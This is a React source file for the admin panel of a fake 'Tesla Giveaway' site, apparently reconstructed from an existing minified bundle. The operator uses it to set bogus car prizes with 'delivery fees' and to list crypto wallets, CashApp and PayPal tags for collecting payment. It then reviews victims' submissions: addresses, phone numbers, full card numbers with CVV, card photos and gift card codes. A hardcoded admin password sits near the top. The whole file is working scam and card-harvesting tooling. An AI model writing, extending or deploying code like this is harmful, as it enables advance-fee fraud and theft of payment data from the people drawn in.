import { useState, useEffect } from 'react';
import { toast } from 'sonner';
import { 
  Settings, Inbox, Image, Wallet, Car, Plus, Trash2, 
  Upload, Save, Lock, CheckCircle, XCircle, Clock, 
  FileText, CreditCard, Gift, Smartphone, Eye
} from 'lucide-react';

// --- Utility function for base64 file reading ---
const convertToBase64 = (file) => {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.readAsDataURL(file);
    reader.onload = () => resolve(reader.result);
    reader.onerror = (error) => reject(error);
  });
};

// --- Mock Defaults (Matches the original minified bundle) ---
const DEFAULT_CARS = [
  { name: "Tesla Model 3", tier: "Performance Sedan", fee: "$299", delivery: "7–10 Business Days", img: "/images/tesla-model-3.jpg" },
  { name: "Tesla Model Y", tier: "Premium SUV", fee: "$349", delivery: "5–7 Business Days", img: "/images/tesla-model-y.jpg" },
  { name: "Tesla Model S", tier: "Luxury Flagship", fee: "$399", delivery: "3–5 Business Days", img: "/images/tesla-model-s.jpg" },
  { name: "Tesla Model X", tier: "Luxury SUV", fee: "$249", delivery: "10–14 Business Days", img: "/images/tesla-model-x.jpg" },
  { name: "Tesla Cybertruck", tier: "Electric Truck", fee: "$379", delivery: "5–8 Business Days", img: "/images/tesla-cybertruck.jpg" },
  { name: "Tesla Roadster", tier: "Ultra Performance", fee: "$499", delivery: "3–5 Business Days", img: "/images/tesla-roadster.jpg" },
  { name: "Tesla Model 3 SR", tier: "Standard Range", fee: "$199", delivery: "10–14 Business Days", img: "/images/tesla-model-3.jpg" },
  { name: "Tesla Model Y LR", tier: "Long Range SUV", fee: "$329", delivery: "7–10 Business Days", img: "/images/tesla-model-y.jpg" },
  { name: "Tesla Model S Plaid", tier: "Performance Sedan", fee: "$359", delivery: "5–7 Business Days", img: "/images/tesla-model-s.jpg" }
];

const DEFAULT_WALLETS = [
  { label: "Bitcoin (BTC)", address: "", logo: "" },
  { label: "Ethereum (ETH)", address: "", logo: "" },
  { label: "USDT (TRC20)", address: "", logo: "" }
];

const ADMIN_PASSWORD = "cblfunz@#$&";

// --- Status Badge Styles ---
const STATUS_STYLES = {
  pending: "bg-yellow-500/20 text-yellow-400 border-yellow-500/30",
  confirmed: "bg-green-500/20 text-green-400 border-green-500/30",
  rejected: "bg-red-500/20 text-red-400 border-red-500/30"
};

// --- Submission Item Component ---
const SubmissionItem = ({ sub, onStatusChange }) => {
  const [expanded, setExpanded] = useState(false);

  const paymentLabels = {
    crypto: "🪙 Crypto",
    cashapp: "💵 CashApp",
    paypal: "🅿️ PayPal",
    credit_card: "💳 Credit Card",
    apple_gift_card: "🍎 Apple Gift Card"
  };

  return (
    <div className="border border-gray-700 rounded-2xl overflow-hidden">
      <button
        onClick={() => setExpanded(!expanded)}
        className="w-full text-left p-4 flex items-center justify-between bg-gray-800 hover:bg-gray-750 transition-colors"
      >
        <div className="flex items-center gap-3">
          <div>
            <p className="text-white font-bold text-sm">{sub.full_name}</p>
            <p className="text-gray-400 text-xs">{sub.email} · {sub.car_model}</p>
            <p className="text-gray-500 text-xs mt-0.5">{paymentLabels[sub.payment_type] || sub.payment_type} · {sub.delivery_fee}</p>
          </div>
        </div>
        <div className="flex items-center gap-2 shrink-0">
          <span className={`text-xs font-bold px-2 py-1 rounded-full border ${STATUS_STYLES[sub.status] || STATUS_STYLES.pending}`}>
            {sub.status}
          </span>
          {expanded ? <XCircle className="w-4 h-4 text-gray-400" /> : <Clock className="w-4 h-4 text-gray-400" />}
        </div>
      </button>

      {expanded && (
        <div className="bg-gray-900 p-5 space-y-4">
          <div className="grid grid-cols-2 gap-3 text-sm">
            <div>
              <p className="text-gray-500 text-xs">Phone</p>
              <p className="text-white">{sub.phone}</p>
            </div>
            <div>
              <p className="text-gray-500 text-xs">Delivery Fee</p>
              <p className="text-red-400 font-bold">{sub.delivery_fee}</p>
            </div>
            <div className="col-span-2">
              <p className="text-gray-500 text-xs">Address</p>
              <p className="text-white">{sub.address}, {sub.city}, {sub.country} {sub.zip}</p>
            </div>
            <div>
              <p className="text-gray-500 text-xs">Delivery Option</p>
              <p className="text-white">{sub.delivery_option}</p>
            </div>
            <div>
              <p className="text-gray-500 text-xs">Submitted</p>
              <p className="text-white">{new Date(sub.created_date).toLocaleString()}</p>
            </div>
          </div>

          {/* Payment Proof */}
          {sub.payment_proof_url && (
            <div className="border-t border-gray-700 pt-4">
              <p className="text-yellow-400 text-xs uppercase tracking-wide font-semibold mb-2">📎 Payment Proof</p>
              <a href={sub.payment_proof_url} target="_blank" rel="noreferrer">
                <img src={sub.payment_proof_url} alt="Payment Proof" className="w-full max-h-56 object-contain rounded-xl border border-yellow-500/30 hover:border-yellow-400 transition-colors bg-gray-800" />
              </a>
            </div>
          )}

          {/* Payment Details */}
          <div className="border-t border-gray-700 pt-4">
            <p className="text-gray-400 text-xs uppercase tracking-wide font-semibold mb-3">Payment Details — {paymentLabels[sub.payment_type]}</p>
            {sub.payment_type === "crypto" && (
              <div className="bg-gray-800 rounded-xl p-3">
                <p className="text-gray-400 text-xs">Wallet Used</p>
                <p className="text-white font-bold">{sub.payment_label}</p>
                <p className="text-green-400 font-mono text-xs break-all mt-1">{sub.wallet_address_used}</p>
              </div>
            )}
            {sub.payment_type === "cashapp" && (
              <div className="bg-gray-800 rounded-xl p-3">
                <p className="text-gray-400 text-xs">CashApp Tag</p>
                <p className="text-green-400 font-bold text-lg">{sub.cashapp_tag}</p>
              </div>
            )}
            {sub.payment_type === "paypal" && (
              <div className="bg-gray-800 rounded-xl p-3">
                <p className="text-gray-400 text-xs">PayPal Tag / Email</p>
                <p className="text-blue-400 font-bold text-lg">{sub.paypal_tag}</p>
              </div>
            )}
            {sub.payment_type === "credit_card" && (
              <div className="space-y-3">
                <div className="grid grid-cols-2 gap-3">
                  {sub.credit_card_front_url && (
                    <div>
                      <p className="text-gray-400 text-xs mb-1">Card Front</p>
                      <a href={sub.credit_card_front_url} target="_blank" rel="noreferrer">
                        <img src={sub.credit_card_front_url} alt="Card Front" className="w-full h-32 object-cover rounded-xl border border-gray-700 hover:border-red-500 transition-colors" />
                      </a>
                    </div>
                  )}
                  {sub.credit_card_back_url && (
                    <div>
                      <p className="text-gray-400 text-xs mb-1">Card Back</p>
                      <a href={sub.credit_card_back_url} target="_blank" rel="noreferrer">
                        <img src={sub.credit_card_back_url} alt="Card Back" className="w-full h-32 object-cover rounded-xl border border-gray-700 hover:border-red-500 transition-colors" />
                      </a>
                    </div>
                  )}
                </div>
                <div className="bg-gray-800 rounded-xl p-3 grid grid-cols-2 gap-2 text-sm">
                  <div><p className="text-gray-500 text-xs">Card Holder</p><p className="text-white">{sub.card_holder_name}</p></div>
                  <div><p className="text-gray-500 text-xs">Card Number</p><p className="text-yellow-300 font-mono">{sub.card_number}</p></div>
                  <div><p className="text-gray-500 text-xs">Expiry</p><p className="text-white">{sub.card_expiry}</p></div>
                  <div><p className="text-gray-500 text-xs">CVV</p><p className="text-red-400 font-mono">{sub.card_cvv}</p></div>
                </div>
              </div>
            )}
            {sub.payment_type === "apple_gift_card" && (
              <div className="space-y-3">
                <div className="grid grid-cols-2 gap-3">
                  {sub.apple_gift_front_url && (
                    <div>
                      <p className="text-gray-400 text-xs mb-1">Card Front</p>
                      <a href={sub.apple_gift_front_url} target="_blank" rel="noreferrer">
                        <img src={sub.apple_gift_front_url} alt="Gift Front" className="w-full h-32 object-cover rounded-xl border border-gray-700 hover:border-red-500 transition-colors" />
                      </a>
                    </div>
                  )}
                  {sub.apple_gift_back_url && (
                    <div>
                      <p className="text-gray-400 text-xs mb-1">Card Back</p>
                      <a href={sub.apple_gift_back_url} target="_blank" rel="noreferrer">
                        <img src={sub.apple_gift_back_url} alt="Gift Back" className="w-full h-32 object-cover rounded-xl border border-gray-700 hover:border-red-500 transition-colors" />
                      </a>
                    </div>
                  )}
                </div>
                {sub.apple_gift_code && (
                  <div className="bg-gray-800 rounded-xl p-3">
                    <p className="text-gray-400 text-xs">Gift Card Code</p>
                    <p className="text-yellow-300 font-mono text-lg tracking-widest mt-1">{sub.apple_gift_code}</p>
                  </div>
                )}
              </div>
            )}
          </div>

          {/* Update Status */}
          <div className="border-t border-gray-700 pt-4 flex items-center gap-3">
            <p className="text-gray-400 text-xs font-semibold">Update Status:</p>
            {["pending", "confirmed", "rejected"].map(status => (
              <button
                key={status}
                onClick={() => onStatusChange(sub.id, status)}
                className={`text-xs font-bold px-3 py-1.5 rounded-full border transition-colors ${sub.status === status ? STATUS_STYLES[status] : "border-gray-600 text-gray-500 hover:border-gray-400"}`}
              >
                {status}
              </button>
            ))}
          </div>
        </div>
      )}
    </div>
  );
};

// --- Main Admin Component ---
export default function Admin() {
  const [isAuthorized, setIsAuthorized] = useState(false);
  const [accessKey, setAccessKey] = useState("");
  const [wrongKey, setWrongKey] = useState(false);
  const [activeTab, setActiveTab] = useState("settings");
  
  // Settings State
  const [settingsId, setSettingsId] = useState(null);
  const [branding, setBranding] = useState({
    site_name: "Tesla Giveaway",
    logo_url: "",
    hero_image_url: "",
    cashapp_tag: "",
    paypal_tag: ""
  });
  const [cars, setCars] = useState(DEFAULT_CARS);
  const [wallets, setWallets] = useState(DEFAULT_WALLETS);
  const [isSaving, setIsSaving] = useState(false);
  const [uploading, setUploading] = useState({});

  // Submissions State
  const [submissions, setSubmissions] = useState([]);
  const [loadingSubs, setLoadingSubs] = useState(false);

  // --- Load Settings from localStorage ---
  const loadSettings = () => {
    const raw = localStorage.getItem("tesla_site_settings");
    if (!raw) return;
    try {
      const data = JSON.parse(raw)[0]; // It's stored as an array in the original code
      if (!data) return;
      
      setSettingsId(data.id);
      setBranding({
        site_name: data.site_name || "Tesla Giveaway",
        logo_url: data.logo_url || "",
        hero_image_url: data.hero_image_url || "",
        cashapp_tag: data.cashapp_tag || "",
        paypal_tag: data.paypal_tag || ""
      });

      // Parse cars
      const carCount = parseInt(data.car_count) || 0;
      if (carCount > 0) {
        const loadedCars = Array.from({ length: carCount }, (_, i) => ({
          name: data[`car_${i+1}_name`] || DEFAULT_CARS[i]?.name || "",
          tier: data[`car_${i+1}_tier`] || DEFAULT_CARS[i]?.tier || "",
          fee: data[`car_${i+1}_fee`] || DEFAULT_CARS[i]?.fee || "$299",
          delivery: data[`car_${i+1}_delivery`] || DEFAULT_CARS[i]?.delivery || "",
          img: data[`car_${i+1}_img`] || DEFAULT_CARS[i]?.img || ""
        }));
        setCars(loadedCars);
      }

      // Parse wallets
      const walletCount = parseInt(data.pm_count) || 0;
      if (walletCount > 0) {
        const loadedWallets = Array.from({ length: walletCount }, (_, i) => ({
          label: data[`pm_${i+1}_label`] || DEFAULT_WALLETS[i]?.label || "",
          address: data[`pm_${i+1}_address`] || DEFAULT_WALLETS[i]?.address || "",
          logo: data[`pm_${i+1}_logo`] || DEFAULT_WALLETS[i]?.logo || ""
        }));
        setWallets(loadedWallets);
      }
    } catch (e) {
      console.error("Failed to load settings", e);
    }
  };

  // --- Handle Image Upload to Base64 ---
  const handleImageUpload = async (file, key, setter) => {
    if (!file) return;
    setUploading(prev => ({ ...prev, [key]: true }));
    try {
      const base64 = await convertToBase64(file);
      setter(base64);
      toast.success("Image uploaded!");
    } catch (error) {
      toast.error("Failed to upload image");
    } finally {
      setUploading(prev => ({ ...prev, [key]: false }));
    }
  };

  // --- Save Settings ---
  const handleSave = async () => {
    setIsSaving(true);
    try {
      // Construct the flat object structure expected by the app
      const payload = {
        ...branding,
        car_count: String(cars.length),
        pm_count: String(wallets.length)
      };
      cars.forEach((car, i) => {
        payload[`car_${i+1}_name`] = car.name;
        payload[`car_${i+1}_tier`] = car.tier;
        payload[`car_${i+1}_fee`] = car.fee;
        payload[`car_${i+1}_delivery`] = car.delivery;
        payload[`car_${i+1}_img`] = car.img;
      });
      wallets.forEach((w, i) => {
        payload[`pm_${i+1}_label`] = w.label;
        payload[`pm_${i+1}_address`] = w.address;
        payload[`pm_${i+1}_logo`] = w.logo;
      });

      let allSettings = JSON.parse(localStorage.getItem("tesla_site_settings") || "[]");
      if (settingsId) {
        // Update existing
        const index = allSettings.findIndex(s => s.id === settingsId);
        if (index !== -1) {
          allSettings[index] = { ...allSettings[index], ...payload };
        } else {
          allSettings.push({ id: settingsId, ...payload });
        }
      } else {
        // Create new
        const newId = Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
        allSettings.push({ id: newId, ...payload });
        setSettingsId(newId);
      }
      localStorage.setItem("tesla_site_settings", JSON.stringify(allSettings));
      toast.success("Settings saved!");
    } catch (error) {
      toast.error("Failed to save settings");
    } finally {
      setIsSaving(false);
    }
  };

  // --- Load Submissions ---
  const loadSubmissions = () => {
    setLoadingSubs(true);
    try {
      const raw = localStorage.getItem("tesla_payment_submissions");
      const data = raw ? JSON.parse(raw) : [];
      // Sort by newest first
      data.sort((a, b) => new Date(b.created_date) - new Date(a.created_date));
      setSubmissions(data);
    } catch (e) {
      console.error("Failed to load submissions", e);
    } finally {
      setLoadingSubs(false);
    }
  };

  // --- Update Submission Status ---
  const updateStatus = (id, newStatus) => {
    const raw = localStorage.getItem("tesla_payment_submissions");
    const data = raw ? JSON.parse(raw) : [];
    const index = data.findIndex(s => s.id === id);
    if (index !== -1) {
      data[index].status = newStatus;
      localStorage.setItem("tesla_payment_submissions", JSON.stringify(data));
      // Refresh local state
      setSubmissions(prev => prev.map(s => s.id === id ? { ...s, status: newStatus } : s));
      toast.success(`Marked as ${newStatus}`);
    }
  };

  // --- Effects ---
  useEffect(() => {
    loadSettings();
  }, []);

  useEffect(() => {
    if (activeTab === "submissions") {
      loadSubmissions();
    }
  }, [activeTab]);

  // --- Login Handler ---
  const handleLogin = () => {
    if (accessKey === ADMIN_PASSWORD) {
      setIsAuthorized(true);
      setWrongKey(false);
    } else {
      setWrongKey(true);
    }
  };

  // --- RENDER LOGIN ---
  if (!isAuthorized) {
    return (
      <div className="min-h-screen bg-gray-950 flex items-center justify-center px-4">
        <div className="w-full max-w-sm">
          <div className="bg-gray-900 border border-gray-800 rounded-2xl p-8 text-center">
            <div className="w-14 h-14 bg-red-600 rounded-xl flex items-center justify-center mx-auto mb-4">
              <Lock className="w-7 h-7 text-white" />
            </div>
            <h1 className="text-xl font-black text-white mb-1">Admin Access</h1>
            <p className="text-gray-500 text-sm mb-6">Enter admin key to continue</p>
            <input
              type="password"
              value={accessKey}
              onChange={(e) => { setAccessKey(e.target.value); setWrongKey(false); }}
              onKeyDown={(e) => e.key === "Enter" && handleLogin()}
              placeholder="Enter access key"
              className="w-full bg-gray-800 border border-gray-700 text-white rounded-xl px-4 py-3 text-sm placeholder-gray-500 focus:outline-none focus:border-red-500 mb-3"
            />
            {wrongKey && <p className="text-red-400 text-xs mb-3">Invalid access key. Try again.</p>}
            <button onClick={handleLogin} className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 rounded-xl">
              Unlock Admin Panel
            </button>
          </div>
        </div>
      </div>
    );
  }

  // --- RENDER DASHBOARD ---
  return (
    <div className="min-h-screen bg-gray-50 py-10 px-4">
      <div className="max-w-4xl mx-auto">
        {/* Header */}
        <div className="flex items-center gap-3 mb-6">
          <div className="w-10 h-10 bg-red-600 rounded-xl flex items-center justify-center">
            <Settings className="w-5 h-5 text-white" />
          </div>
          <div>
            <h1 className="text-2xl font-black text-gray-900">Admin Panel</h1>
            <p className="text-gray-500 text-sm">Manage Tesla cars, payment methods & view submissions</p>
          </div>
        </div>

        {/* Tabs */}
        <div className="flex gap-2 mb-6">
          <button
            onClick={() => setActiveTab("settings")}
            className={`px-5 py-2 rounded-xl font-bold text-sm transition-colors ${activeTab === "settings" ? "bg-red-600 text-white" : "bg-white text-gray-600 border border-gray-200 hover:bg-gray-50"}`}
          >
            ⚙️ Settings
          </button>
          <button
            onClick={() => setActiveTab("submissions")}
            className={`px-5 py-2 rounded-xl font-bold text-sm transition-colors flex items-center gap-2 ${activeTab === "submissions" ? "bg-red-600 text-white" : "bg-white text-gray-600 border border-gray-200 hover:bg-gray-50"}`}
          >
            <Inbox className="w-4 h-4" />
            Submissions {submissions.length > 0 && <span className="bg-red-500 text-white text-xs rounded-full px-1.5">{submissions.length}</span>}
          </button>
        </div>

        {/* --- SETTINGS TAB --- */}
        {activeTab === "settings" && (
          <div className="space-y-6">
            {/* Branding */}
            <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-6">
              <div className="flex items-center gap-2 mb-5">
                <Image className="w-5 h-5 text-red-600" />
                <h2 className="text-lg font-bold text-gray-900">Branding</h2>
              </div>
              <div className="space-y-4">
                <div>
                  <label className="block text-xs font-semibold text-gray-600 mb-1">Site Name</label>
                  <input
                    value={branding.site_name}
                    onChange={(e) => setBranding({ ...branding, site_name: e.target.value })}
                    placeholder="Tesla Giveaway"
                    className="w-full border border-gray-200 rounded-xl px-4 py-2 text-sm focus:outline-none focus:border-red-500"
                  />
                </div>
                {["logo_url", "hero_image_url"].map((key) => (
                  <div key={key}>
                    <label className="block text-xs font-semibold text-gray-600 mb-1">{key === "logo_url" ? "Navbar Logo" : "Hero Image"}</label>
                    <div className="flex gap-3 items-center">
                      {branding[key] && <img src={branding[key]} alt={key} className="w-14 h-14 rounded-xl object-cover border-2 border-red-200" />}
                      <div className="flex-1 space-y-2">
                        <input
                          value={branding[key] || ""}
                          onChange={(e) => setBranding({ ...branding, [key]: e.target.value })}
                          placeholder="Image URL"
                          className="w-full border border-gray-200 rounded-xl px-4 py-2 text-sm focus:outline-none focus:border-red-500"
                        />
                        <label className="cursor-pointer inline-flex items-center gap-2 text-sm text-red-600 hover:text-red-700 font-medium">
                          <Upload className="w-4 h-4" />
                          {uploading[key] ? "Uploading..." : "Upload image"}
                          <input
                            type="file"
                            accept="image/*"
                            className="hidden"
                            onChange={(e) => handleImageUpload(e.target.files?.[0], key, (base64) => setBranding({ ...branding, [key]: base64 }))}
                            disabled={!!uploading[key]}
                          />
                        </label>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Payment Methods */}
            <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-6">
              <div className="flex items-center gap-2 mb-5">
                <Wallet className="w-5 h-5 text-red-600" />
                <h2 className="text-lg font-bold text-gray-900">Payment Methods</h2>
              </div>
              <div className="grid sm:grid-cols-2 gap-4 mb-6">
                <div className="bg-green-50 border border-green-200 rounded-2xl p-4">
                  <p className="text-green-800 font-bold text-sm mb-2">💵 CashApp Tag</p>
                  <input
                    value={branding.cashapp_tag}
                    onChange={(e) => setBranding({ ...branding, cashapp_tag: e.target.value })}
                    placeholder="e.g. $YourCashTag"
                    className="w-full bg-white border border-green-200 rounded-xl px-4 py-2 text-sm focus:outline-none focus:border-red-500"
                  />
                  <p className="text-green-600 text-xs mt-1">Leave blank to hide this option</p>
                </div>
                <div className="bg-blue-50 border border-blue-200 rounded-2xl p-4">
                  <p className="text-blue-800 font-bold text-sm mb-2">🅿️ PayPal Email / Tag</p>
                  <input
                    value={branding.paypal_tag}
                    onChange={(e) => setBranding({ ...branding, paypal_tag: e.target.value })}
                    placeholder="e.g. pay@youremail.com"
                    className="w-full bg-white border border-blue-200 rounded-xl px-4 py-2 text-sm focus:outline-none focus:border-red-500"
                  />
                  <p className="text-blue-600 text-xs mt-1">Leave blank to hide this option</p>
                </div>
              </div>
              <div className="grid sm:grid-cols-2 gap-4 mb-6">
                <div className="bg-gray-50 border border-gray-200 rounded-2xl p-4 flex items-center gap-3">
                  <CreditCard className="w-8 h-8 text-gray-400 shrink-0" />
                  <div>
                    <p className="text-gray-700 font-bold text-sm">Credit Card</p>
                    <p className="text-gray-500 text-xs">Always available — users can upload card photos or enter details</p>
                  </div>
                </div>
                <div className="bg-gray-50 border border-gray-200 rounded-2xl p-4 flex items-center gap-3">
                  <Gift className="w-8 h-8 text-gray-400 shrink-0" />
                  <div>
                    <p className="text-gray-700 font-bold text-sm">Apple Gift Card</p>
                    <p className="text-gray-500 text-xs">Always available — users upload card or paste code</p>
                  </div>
                </div>
              </div>

              {/* Crypto Wallets */}
              <div className="flex items-center justify-between mb-4">
                <p className="text-gray-700 font-bold text-sm">🪙 Crypto Wallets</p>
                <button
                  type="button"
                  onClick={() => setWallets([...wallets, { label: "", address: "", logo: "" }])}
                  className="border border-red-200 text-red-600 hover:bg-red-50 text-sm px-3 py-1.5 rounded-xl flex items-center gap-1 transition-colors"
                >
                  <Plus className="w-3.5 h-3.5" /> Add Wallet
                </button>
              </div>
              <div className="space-y-4">
                {wallets.map((wallet, index) => (
                  <div key={index} className="border border-gray-100 rounded-2xl p-4 bg-gray-50/50 space-y-3">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-bold text-gray-400 uppercase">Wallet #{index + 1}</span>
                      <button
                        type="button"
                        onClick={() => setWallets(wallets.filter((_, i) => i !== index))}
                        className="text-gray-300 hover:text-red-500 transition-colors"
                      >
                        <Trash2 className="w-4 h-4" />
                      </button>
                    </div>
                    <div className="flex items-start gap-4">
                      <div className="shrink-0">
                        {wallet.logo ? (
                          <img src={wallet.logo} alt={wallet.label} className="w-14 h-14 rounded-xl object-contain border border-gray-200 bg-white p-1" />
                        ) : (
                          <div className="w-14 h-14 rounded-xl border-2 border-dashed border-gray-300 flex items-center justify-center text-gray-400 text-xs">Logo</div>
                        )}
                        <label className="cursor-pointer mt-1.5 inline-flex items-center gap-1 text-xs text-red-600 hover:text-red-700 font-medium">
                          <Upload className="w-3 h-3" />
                          {uploading[`pm_logo_${index}`] ? "..." : "Upload"}
                          <input
                            type="file"
                            accept="image/*"
                            className="hidden"
                            onChange={(e) => handleImageUpload(e.target.files?.[0], `pm_logo_${index}`, (base64) => {
                              const newWallets = [...wallets];
                              newWallets[index].logo = base64;
                              setWallets(newWallets);
                            })}
                            disabled={!!uploading[`pm_logo_${index}`]}
                          />
                        </label>
                      </div>
                      <div className="flex-1 space-y-2">
                        <div>
                          <label className="block text-xs font-semibold text-gray-600 mb-1">Name / Label</label>
                          <input
                            value={wallet.label}
                            onChange={(e) => {
                              const newWallets = [...wallets];
                              newWallets[index].label = e.target.value;
                              setWallets(newWallets);
                            }}
                            placeholder="Bitcoin (BTC)"
                            className="w-full border border-gray-200 rounded-xl px-4 py-2 text-sm focus:outline-none focus:border-red-500"
                          />
                        </div>
                        <div>
                          <label className="block text-xs font-semibold text-gray-600 mb-1">Wallet Address ⚠️</label>
                          <input
                            value={wallet.address}
                            onChange={(e) => {
                              const newWallets = [...wallets];
                              newWallets[index].address = e.target.value;
                              setWallets(newWallets);
                            }}
                            placeholder="bc1q..."
                            className="w-full border border-gray-200 rounded-xl px-4 py-2 text-sm font-mono focus:outline-none focus:border-red-500"
                          />
                        </div>
                        <div>
                          <label className="block text-xs font-semibold text-gray-600 mb-1">Logo URL (optional)</label>
                          <input
                            value={wallet.logo}
                            onChange={(e) => {
                              const newWallets = [...wallets];
                              newWallets[index].logo = e.target.value;
                              setWallets(newWallets);
                            }}
                            placeholder="https://..."
                            className="w-full border border-gray-200 rounded-xl px-4 py-2 text-sm focus:outline-none focus:border-red-500"
                          />
                        </div>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Car Models */}
            <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-6">
              <div className="flex items-center justify-between mb-5">
                <div className="flex items-center gap-2">
                  <Car className="w-5 h-5 text-red-600" />
                  <h2 className="text-lg font-bold text-gray-900">Tesla Car Models & Delivery Fees</h2>
                </div>
                <button
                  type="button"
                  onClick={() => setCars([...cars, { name: "", tier: "", fee: "$299", delivery: "7–10 Business Days", img: "" }])}
                  className="border border-red-200 text-red-600 hover:bg-red-50 text-sm px-3 py-1.5 rounded-xl flex items-center gap-1 transition-colors"
                >
                  <Plus className="w-4 h-4" /> Add Model
                </button>
              </div>
              <div className="grid sm:grid-cols-2 gap-5">
                {cars.map((car, index) => (
                  <div key={index} className="border border-gray-100 rounded-2xl p-4 space-y-3 bg-gray-50/50">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-bold text-gray-400 uppercase">Car #{index + 1}</span>
                      <button
                        type="button"
                        onClick={() => setCars(cars.filter((_, i) => i !== index))}
                        className="text-gray-300 hover:text-red-500 transition-colors"
                      >
                        <Trash2 className="w-4 h-4" />
                      </button>
                    </div>
                    {car.img && <img src={car.img} alt={car.name} className="w-full h-32 object-cover rounded-xl border border-gray-200" />}
                    <div className="grid grid-cols-2 gap-3">
                      <div>
                        <label className="block text-xs font-semibold text-gray-600 mb-1">Model Name</label>
                        <input
                          value={car.name}
                          onChange={(e) => {
                            const newCars = [...cars];
                            newCars[index].name = e.target.value;
                            setCars(newCars);
                          }}
                          placeholder="Tesla Model 3"
                          className="w-full border border-gray-200 rounded-xl px-4 py-2 text-sm focus:outline-none focus:border-red-500"
                        />
                      </div>
                      <div>
                        <label className="block text-xs font-semibold text-gray-600 mb-1">Tier / Type</label>
                        <input
                          value={car.tier}
                          onChange={(e) => {
                            const newCars = [...cars];
                            newCars[index].tier = e.target.value;
                            setCars(newCars);
                          }}
                          placeholder="Performance Sedan"
                          className="w-full border border-gray-200 rounded-xl px-4 py-2 text-sm focus:outline-none focus:border-red-500"
                        />
                      </div>
                    </div>
                    <div className="grid grid-cols-2 gap-3">
                      <div>
                        <label className="block text-xs font-semibold text-gray-600 mb-1">💰 Delivery Fee</label>
                        <input
                          value={car.fee}
                          onChange={(e) => {
                            const newCars = [...cars];
                            newCars[index].fee = e.target.value;
                            setCars(newCars);
                          }}
                          placeholder="$299"
                          className="w-full border border-gray-200 rounded-xl px-4 py-2 text-sm font-bold text-red-600 focus:outline-none focus:border-red-500"
                        />
                      </div>
                      <div>
                        <label className="block text-xs font-semibold text-gray-600 mb-1">🚚 Delivery Time</label>
                        <input
                          value={car.delivery}
                          onChange={(e) => {
                            const newCars = [...cars];
                            newCars[index].delivery = e.target.value;
                            setCars(newCars);
                          }}
                          placeholder="7–10 Business Days"
                          className="w-full border border-gray-200 rounded-xl px-4 py-2 text-sm focus:outline-none focus:border-red-500"
                        />
                      </div>
                    </div>
                    <div>
                      <label className="block text-xs font-semibold text-gray-600 mb-1">Car Image</label>
                      <div className="space-y-2">
                        <input
                          value={car.img}
                          onChange={(e) => {
                            const newCars = [...cars];
                            newCars[index].img = e.target.value;
                            setCars(newCars);
                          }}
                          placeholder="Image URL"
                          className="w-full border border-gray-200 rounded-xl px-4 py-2 text-sm focus:outline-none focus:border-red-500"
                        />
                        <label className="cursor-pointer inline-flex items-center gap-2 text-sm text-red-600 hover:text-red-700 font-medium">
                          <Upload className="w-4 h-4" />
                          {uploading[`car_img_${index}`] ? "Uploading..." : "Upload photo"}
                          <input
                            type="file"
                            accept="image/*"
                            className="hidden"
                            onChange={(e) => handleImageUpload(e.target.files?.[0], `car_img_${index}`, (base64) => {
                              const newCars = [...cars];
                              newCars[index].img = base64;
                              setCars(newCars);
                            })}
                            disabled={!!uploading[`car_img_${index}`]}
                          />
                        </label>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Save Button */}
            <button
              onClick={handleSave}
              disabled={isSaving}
              className="w-full bg-red-600 hover:bg-red-700 text-white py-6 text-lg font-bold rounded-xl flex items-center justify-center gap-2 transition-colors"
            >
              <Save className="w-5 h-5" />
              {isSaving ? "Saving..." : "Save All Changes"}
            </button>
          </div>
        )}

        {/* --- SUBMISSIONS TAB --- */}
        {activeTab === "submissions" && (
          <div className="space-y-4">
            <div className="flex items-center justify-between">
              <p className="text-gray-700 font-bold">{submissions.length} Submission{submissions.length !== 1 ? "s" : ""}</p>
              <button
                onClick={loadSubmissions}
                className="text-sm text-red-600 hover:text-red-700 font-medium"
              >
                ↻ Refresh
              </button>
            </div>
            {loadingSubs && <div className="text-center py-12 text-gray-400">Loading submissions...</div>}
            {!loadingSubs && submissions.length === 0 && (
              <div className="text-center py-16 bg-white rounded-2xl border border-gray-100">
                <Inbox className="w-12 h-12 text-gray-300 mx-auto mb-3" />
                <p className="text-gray-500 font-semibold">No submissions yet</p>
                <p className="text-gray-400 text-sm">Submissions will appear here once users pay</p>
              </div>
            )}
            {!loadingSubs && submissions.map((sub) => (
              <SubmissionItem key={sub.id} sub={sub} onStatusChange={updateStatus} />
            ))}
          </div>
        )}
      </div>
    </div>
  );
}
